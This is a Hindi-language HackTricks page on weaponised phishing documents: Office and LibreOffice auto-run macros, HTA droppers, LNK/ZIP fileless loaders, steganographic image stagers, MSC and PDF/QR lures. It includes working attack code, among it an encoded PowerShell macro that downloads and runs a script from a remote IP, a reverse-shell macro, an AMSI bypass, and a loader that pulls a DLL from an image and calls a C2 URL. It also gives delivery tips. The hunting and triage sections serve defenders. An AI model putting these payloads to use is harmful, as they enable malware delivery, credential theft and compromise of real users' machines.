# फ़िशिंग फ़ाइलें और दस्तावेज़

{{#include ../../banners/hacktricks-training.md}}

## Office दस्तावेज़

Microsoft Word किसी फ़ाइल को खोलने से पहले उसके फ़ाइल डेटा का validation करता है। डेटा validation, OfficeOpenXML standard के अनुसार डेटा संरचना की पहचान के रूप में किया जाता है। यदि डेटा संरचना की पहचान के दौरान कोई त्रुटि होती है, तो विश्लेषण की जा रही फ़ाइल नहीं खुलेगी।

आमतौर पर, macros वाली Word फ़ाइलों में `.docm` extension होता है। हालाँकि, फ़ाइल extension बदलकर फ़ाइल का नाम बदलना संभव है और फिर भी उसकी macro निष्पादन क्षमता बनी रहती है।\
उदाहरण के लिए, RTF फ़ाइल में डिज़ाइन के अनुसार macros का समर्थन नहीं होता, लेकिन DOCM फ़ाइल का नाम बदलकर RTF करने पर Microsoft Word उसे संभालेगा और उसमें macro निष्पादित करने की क्षमता होगी।\
यही आंतरिक संरचना और तंत्र Microsoft Office Suite के सभी सॉफ़्टवेयर (Excel, PowerPoint आदि) पर लागू होते हैं।

कुछ Office प्रोग्राम किन extensions को निष्पादित करने वाले हैं, यह जाँचने के लिए आप निम्न command का उपयोग कर सकते हैं:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX फ़ाइलें जो macros वाले remote template (File –Options –Add-ins –Manage: Templates –Go) को संदर्भित करती हैं, macros को “execute” भी कर सकती हैं।

### External Image Load

यहाँ जाएँ: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, और **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Go to: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

दस्तावेज़ से मनमाना code चलाने के लिए macros का उपयोग करना संभव है।

#### Autoload functions

वे जितने अधिक सामान्य होते हैं, AV द्वारा उनका पता लगाए जाने की संभावना उतनी ही अधिक होती है।

- AutoOpen()
- Document_Open()

#### Macros Code Examples

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### मेटाडेटा मैन्युअली हटाएँ

**File > Info > Inspect Document > Inspect Document** पर जाएँ। इससे Document Inspector खुलेगा। **Inspect** पर क्लिक करें, फिर **Document Properties and Personal Information** के बगल में **Remove All** पर क्लिक करें।

#### Doc एक्सटेंशन

काम पूरा होने पर, **Save as type** ड्रॉपडाउन चुनें और फ़ॉर्मैट को **`.docx`** से बदलकर Word 97-2003 **`.doc`** करें।\
ऐसा इसलिए करें क्योंकि आप **`.docx` में macros सेव नहीं कर सकते** और macro-सक्षम **`.docm`** एक्सटेंशन को लेकर **कलंक** है (उदाहरण के लिए, उसके thumbnail icon पर बड़ा `!` होता है और कुछ web/email gateway उन्हें पूरी तरह ब्लॉक कर देते हैं)। इसलिए, यह **legacy `.doc` एक्सटेंशन सबसे अच्छा समझौता है**।

#### Malicious Macros जनरेटर

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer documents में Basic macros एम्बेड किए जा सकते हैं और **Open Document** event से macro बाँधकर फ़ाइल खुलने पर उन्हें अपने-आप execute कराया जा सकता है (Tools → Customize → Events → Open Document → Macro…)।<sup>[[1]](#references)</sup> एक साधारण reverse shell macro ऐसा दिखता है:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

ध्यान दें कि string के अंदर doubled quotes (`""`) हैं – LibreOffice Basic में इनका उपयोग literal quotes को escape करने के लिए किया जाता है, इसलिए `...==""")` पर समाप्त होने वाले payloads में inner command और Shell argument, दोनों संतुलित रहते हैं।

डिलीवरी के सुझाव:

- `.odt` के रूप में सेव करें और macro को document event से bind करें, ताकि document खुलते ही यह तुरंत चले।
- `swaks` से ईमेल भेजते समय `--attach @resume.odt` का उपयोग करें (`@` आवश्यक है, ताकि attachment के रूप में filename string के बजाय file bytes भेजे जाएँ)। यह उन SMTP servers का दुरुपयोग करते समय महत्वपूर्ण है जो बिना validation के मनमाने `RCPT TO` recipients स्वीकार करते हैं।

## HTA Files

HTA एक Windows प्रोग्राम है जो **HTML और scripting languages (जैसे VBScript और JScript) को मिलाता है**। यह user interface बनाता है और browser के security model की पाबंदियों के बिना, एक "fully trusted" application के रूप में चलता है।

HTA को **`mshta.exe`** का उपयोग करके चलाया जाता है, जो आमतौर पर **Internet Explorer** के साथ **installed** होता है, इसलिए **`mshta`, IE पर निर्भर है**। यदि इसे uninstall कर दिया गया है, तो HTA चल नहीं पाएँगे।

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## NTLM Authentication को बाध्य करना

**दूरस्थ रूप से** NTLM authentication को **बाध्य** करने के कई तरीके हैं। उदाहरण के लिए, आप ईमेल या ऐसे HTML में **अदृश्य images** जोड़ सकते हैं जिन्हें उपयोगकर्ता खोलेगा (HTTP MitM के ज़रिए भी?)। या पीड़ित को ऐसी **फ़ाइलों के पते** भेज सकते हैं जो **फ़ोल्डर खोलने भर से authentication** को **ट्रिगर** करें।

**इन और अन्य तरीकों के बारे में इन पेजों पर जानें:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

यह न भूलें कि आप केवल hash या authentication चुरा ही नहीं सकते, बल्कि **NTLM relay attacks भी कर सकते हैं**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

अत्यधिक प्रभावी campaigns ऐसी ZIP फ़ाइल भेजते हैं जिसमें दो वैध decoy दस्तावेज़ (PDF/DOCX) और एक malicious .lnk होता है। तरकीब यह है कि असली PowerShell loader, एक अनूठे marker के बाद ZIP के raw bytes में रखा जाता है और .lnk उसे निकालकर पूरी तरह memory में चलाता है।<sup>[[2]](#references)</sup>

.lnk PowerShell one-liner द्वारा लागू किया जाने वाला सामान्य क्रम:

1) सामान्य paths में मूल ZIP खोजें: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, और मौजूदा working directory का parent.
2) ZIP bytes पढ़ें और hardcoded marker (जैसे xFIQCV) ढूँढें। Marker के बाद का सारा डेटा embedded PowerShell payload होता है।
3) ZIP को %ProgramData% में copy करें, वहीं extract करें और वैध दिखने के लिए decoy .docx खोलें।
4) मौजूदा process के लिए AMSI को bypass करें: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) अगली stage को deobfuscate करें (जैसे सभी # characters हटाएँ) और उसे memory में execute करें।

Embedded stage को निकालकर चलाने के लिए PowerShell skeleton का उदाहरण:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

नोट्स
- Delivery में अक्सर प्रतिष्ठित PaaS subdomains (जैसे, *.herokuapp.com) का दुरुपयोग किया जाता है और payloads को gate किया जा सकता है (IP/UA के आधार पर benign ZIPs serve करना)।
- अगला stage अक्सर base64/XOR shellcode को decrypt करता है और disk artifacts कम करने के लिए उसे Reflection.Emit + VirtualAlloc के ज़रिए execute करता है।

इसी chain में इस्तेमाल किया गया Persistence
- Microsoft Web Browser control को COM TypeLib hijacking के ज़रिए hijack करना, ताकि IE/Explorer या उसे embed करने वाला कोई भी app payload को अपने-आप फिर से launch करे।<sup>[[2]](#references)[[4]](#references)</sup> विवरण और इस्तेमाल के लिए तैयार commands यहाँ देखें:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ऐसी ZIP files जिनमें archive data के अंत में ASCII marker string (जैसे, xFIQCV) जोड़ी गई हो।
- ऐसी .lnk जो ZIP ढूँढने के लिए parent/user folders को enumerate करती है और एक decoy document खोलती है।
- [System.Management.Automation.AmsiUtils]::amsiInitFailed के ज़रिए AMSI tampering।
- भरोसेमंद PaaS domains पर hosted links के साथ समाप्त होने वाले लंबे business threads।

## LNK में पहले decoy staging → scheduled-task persistence → भरोसेमंद CPL side-loading

एक और बार-बार दिखने वाला pattern है **document का रूप धारण करने वाली `.lnk`**, जो background में असली chain को stage करते हुए तुरंत एक benign lure खोलती है।<sup>[[3]](#references)</sup>

देखा गया workflow:
1. Shortcut **PDF का रूप धारण करता है** और obfuscated PowerShell downloader चलाने के लिए `conhost.exe` या इसी तरह के proxy का इस्तेमाल करता है।
2. PowerShell स्पष्ट tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) को तोड़ देता है, ताकि `iwr`, `gci`, `ren`, `cpi` या `schtasks` खोजने वाले सरल detections command को पकड़ न सकें।
3. Stager पहले **decoy document download** करता है, उसे victim के लिए खोलता है, और फिर background में malicious files को दोबारा तैयार करता है।
4. Payloads को **junk extensions** के साथ लिखा जा सकता है और फिर filler characters हटाकर उनका नाम बदला जा सकता है, जिससे स्पष्ट `.exe` / `.cpl` artifacts देर से दिखाई देते हैं।
5. Persistence एक **minute-based scheduled task** से स्थापित की जाती है, जो user-writable path से किसी भरोसेमंद host binary को launch करता है।

इस pattern से जुड़े hunting के कुछ संकेत:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

पहचानने योग्य एक उपयोगी staging layout:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` या `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### दूसरा चरण stealthy क्यों है

Rapid7 case study में, scheduled task ने बार-बार `C:\Users\Public\` से **`Fondue.exe`** लॉन्च किया। चूँकि **`APPWIZ.cpl`** को उसके पास stage किया गया था और वह **`RunFODW`** export करता था, इसलिए trusted Microsoft binary ने वैध system copy के बजाय attacker CPL को side-load किया।

इसके बाद CPL:
- `C:\Windows\Tasks\editor.dat` से **AES-256-CBC** blob पढ़ता है
- इसे **Windows CNG / `bcrypt.dll`** के ज़रिए decrypt करता है
- executable memory allocate करता है और decrypted shellcode को उसमें copy करता है
- **`EnumUILanguagesW`** के callback के रूप में shellcode pointer पास करके उसे indirect रूप से execute करता है

आखिरी कदम की अलग से तलाश करना उपयोगी है: malware अक्सर सीधे `((void(*)())buf)()` jump से बचता है और execution transfer करने के लिए इसके बजाय **वैध callback-taking WinAPI** का दुरुपयोग करता है।

इस campaign में decrypted payload **Donut** shellcode था, जिसने फिर अंतिम PE को पूरी तरह memory में map किया और execution सौंपने से पहले current process में **AMSI/WLDP/ETW** को patch किया। Side-loading और memory-resident post-processing पर अधिक जानकारी के लिए देखें:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

जाँच के लिए व्यावहारिक संकेत:
- `.lnk` से `powershell.exe` या `conhost.exe` spawn होना, जिसके बाद कोई decoy document दिखाई दे।
- **`C:\Users\Public\`** में थोड़े समय के लिए downloads होना, जिसके बाद nonsense extensions से तुरंत rename किया जाना।
- `GoogleErrorReport` जैसे साधारण नाम वाले scheduled tasks का **user-writable directories** से execute होना।
- Trusted binaries का उसी non-system directory से **`.cpl` / `.dll`** files load करना।
- **`C:\Windows\Tasks\`** में लिखे गए Base64 text blobs का side-loaded module द्वारा पढ़ा जाना।

## Images में steganography-delimited payloads (PowerShell stager)

हाल की loader chains एक obfuscated JavaScript/VBS पहुँचाती हैं, जो Base64 PowerShell stager को decode करके चलाती है। वह stager एक image (अक्सर GIF) download करती है, जिसमें unique start/end markers के बीच plain text के रूप में छिपी Base64-encoded .NET DLL होती है। Script इन delimiters को खोजती है (जंगली परिवेश में देखे गए उदाहरण: «<<sudo_png>> … <<sudo_odt>>>»), उनके बीच का text निकालती है, उसे bytes में Base64-decode करती है, assembly को memory में load करती है और C2 URL के साथ एक ज्ञात entry method invoke करती है।<sup>[[5]](#references)</sup>

कार्यप्रवाह
- Stage 1: Archived JS/VBS dropper → embedded Base64 decode करता है → `-nop -w hidden -ep bypass` के साथ PowerShell stager लॉन्च करता है।
- Stage 2: PowerShell stager → image download करता है, marker-delimited Base64 निकालता है, .NET DLL को memory में load करता है और C2 URL तथा options देकर उसका method (जैसे, VAI) call करता है।
- Stage 3: Loader अंतिम payload प्राप्त करता है और आमतौर पर उसे process hollowing के ज़रिए किसी trusted binary (अक्सर MSBuild.exe) में inject करता है।<sup>[[7]](#references)[[8]](#references)</sup> Process hollowing और trusted utility proxy execution के बारे में अधिक जानकारी यहाँ देखें:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Image से DLL निकालने और memory में .NET method invoke करने का PowerShell उदाहरण:

<details>
<summary>PowerShell stego payload extractor and loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Notes
- यह ATT&CK T1027.003 (steganography/marker-hiding) है।<sup>[[6]](#references)</sup> Markers अलग-अलग campaigns में बदलते रहते हैं।
- Assembly load करने से पहले आमतौर पर AMSI/ETW bypass और string deobfuscation लागू किए जाते हैं।
- Hunting: डाउनलोड की गई images को ज्ञात delimiters के लिए scan करें; ऐसी PowerShell गतिविधि पहचानें जो images को access करके तुरंत Base64 blobs decode करती है।

stego tools और carving techniques भी देखें:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

एक बार-बार दिखने वाला शुरुआती stage एक छोटी, अत्यधिक obfuscated `.js` या `.vbs` file होती है, जो किसी archive के अंदर भेजी जाती है। इसका एकमात्र उद्देश्य embedded Base64 string को decode करना और HTTPS पर अगला stage शुरू करने के लिए `-nop -w hidden -ep bypass` के साथ PowerShell launch करना है।<sup>[[5]](#references)</sup>

Skeleton logic (abstract):
- अपनी file के contents पढ़ना
- junk strings के बीच Base64 blob ढूँढ़ना
- उसे ASCII PowerShell में decode करना
- `wscript.exe`/`cscript.exe` के ज़रिए `powershell.exe` चलाना

Hunting संकेत
- Archived JS/VBS attachments, जिनकी command line में `-enc`/`FromBase64String` के साथ `powershell.exe` launch होता है।
- `wscript.exe` का user temp paths से `powershell.exe -nop -w hidden` launch करना।

## MSC documents as execution containers (GrimResource)

Microsoft Management Console files (`.msc`) XML console definitions होती हैं, जिन्हें सामान्यतः `mmc.exe` खोलता है। **GrimResource** एक `StringTable` reference का दुरुपयोग करके `apds.dll` resource में मौजूद एक पुराने XSS primitive का इस्तेमाल करता है, जिससे crafted console खोलने पर user के कारण JavaScript `mmc.exe` के अंदर run होती है। देखे गए samples में `transformNode`-based obfuscation को **DotNetToJScript** के साथ मिलाया गया था, ताकि सामान्य Office-macro path के बिना .NET payload instantiate किया जा सके।<sup>[[9]](#references)</sup>

Static triage के लिए, किसी untrusted MSC को text की तरह देखें और उस पर **double-click न करें**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

High-signal runtime pivots में `mmc.exe` का CLR या script components लोड करना, network connections बनाना, या `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` अथवा किसी अप्रत्याशित executable को spawn करना शामिल है। यह format वैध है, इसलिए detections को हर MSC को block करने के बजाय **origin + suspicious XML/script content + `mmc.exe` behavior** के आधार पर correlate करना चाहिए।<sup>[[9]](#references)</sup>

## PDF/QR redirectors और payload gating

PDF उपयोगी होने के लिए उसमें exploit होना ज़रूरी नहीं है। हालिया campaigns में सामान्य दिखने वाले document में **QR code या साधारण link** रखा जाता है, browser session को mail controls से बाहर ले जाया जाता है, और recipient address के अनुसार destination को personalize किया जाता है। Microsoft ने 2025 के ऐसे PDFs का दस्तावेज़ीकरण किया जिनके QR URLs हर recipient के लिए अलग थे और RaccoonO365 credential-harvesting infrastructure तक ले जाते थे; एक समानांतर chain में IP/environment gating का इस्तेमाल करके चुने हुए visitors को JavaScript/MSI path दिया जाता था, जबकि scanners या disallowed clients को benign PDF दिखाया जाता था।<sup>[[10]](#references)</sup>

PDF actions और rendered QR codes—दोनों की triage करें। QR को extract की जा सकने वाली image के बजाय vector के रूप में बनाया गया हो सकता है, इसलिए embedded images निकालने के साथ-साथ हर page को rasterize करें:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

किसी isolated analysis system से बिना authenticate किए decoded destinations और redirects का निरीक्षण करें। उपयोगी hunting features में ऐसे PDF शामिल हैं जिनमें केवल QR code हो और email body लगभग खाली हो, query parameter में recipient email embedded हो, प्रतिष्ठित hosting सेवाओं के ज़रिए कई redirects हों, और IP, geolocation, cookies, referrer या user agent के अनुसार अलग-अलग content लौटे। Controlled profiles के साथ requests की तुलना करें, क्योंकि एक sandbox fetch को केवल decoy मिल सकता है।<sup>[[10]](#references)</sup>

## NTLM hashes चुराने के लिए Windows files

**NTLM creds चुराने की जगहों** के बारे में page देखें:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign: अमेरिकी कंपनियों को निशाना बनाने वाला एक परिष्कृत Phishing Attack](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: China-themed Loader Chain के ज़रिए Dropping Elephant Tradecraft को ट्रैक करना](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – नई COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader कई तरह के Infostealers डिलीवर करता है](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Initial access और evasion के लिए Microsoft Management Console](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Threat actors टैक्स सीज़न का फ़ायदा उठाकर टैक्स-थीम वाले phishing campaigns चलाते हैं](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
